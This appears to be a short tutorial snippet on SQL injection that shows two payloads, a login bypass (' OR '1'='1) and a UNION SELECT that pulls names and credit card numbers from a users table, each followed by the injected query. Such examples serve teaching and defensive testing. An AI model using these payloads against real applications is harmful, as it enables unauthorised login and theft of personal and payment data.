SQL Injection Examples

Example 1: Login Bypass

Input: ' OR '1'='1

This input may trick the SQL query into always returning true, allowing login without credentials.

SELECT * FROM users
WHERE username = '' OR '1'='1'
AND password = '' OR '1'='1';

Example 2: Extracting Data

Input: ' UNION SELECT name, credit_card FROM users --

This could be used to extract sensitive info if the app displays results directly.

SELECT name, email FROM customers
WHERE id = '' UNION SELECT name, credit_card FROM users --';
